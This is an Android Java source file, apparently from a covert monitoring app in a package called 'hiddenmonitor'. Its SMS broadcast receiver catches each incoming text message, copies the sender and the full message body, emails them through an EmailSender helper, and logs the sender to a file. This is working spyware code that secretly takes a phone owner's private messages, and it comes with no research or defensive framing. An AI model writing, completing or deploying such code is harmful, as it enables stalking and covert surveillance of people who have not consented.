package com.example.hiddenmonitor;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

public class SMSReceiver extends BroadcastReceiver {
    
    private static final String TAG = "SMSReceiver";
    private EmailSender emailSender;
    
    @Override
    public void onReceive(Context context, Intent intent) {
        emailSender = new EmailSender(context);
        
        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                try {
                    Object[] pdus = (Object[]) bundle.get("pdus");
                    for (Object pdu : pdus) {
                        SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
                        String sender = sms.getDisplayOriginatingAddress();
                        String message = sms.getDisplayMessageBody();
                        
                        Log.d(TAG, "SMS from: " + sender);
                        
                        String subject = "📱 New SMS Received";
                        String body = "From: " + sender + "\n\n" +
                                     "Message:\n" + message + "\n\n" +
                                     "Time: " + System.currentTimeMillis();
                        
                        emailSender.sendEmail(subject, body);
                        FileLogger.log(context, "SMS from: " + sender);
                    }
                } catch (Exception e) {
                    Log.e(TAG, "SMS error: " + e.getMessage());
                }
            }
        }
    }
}
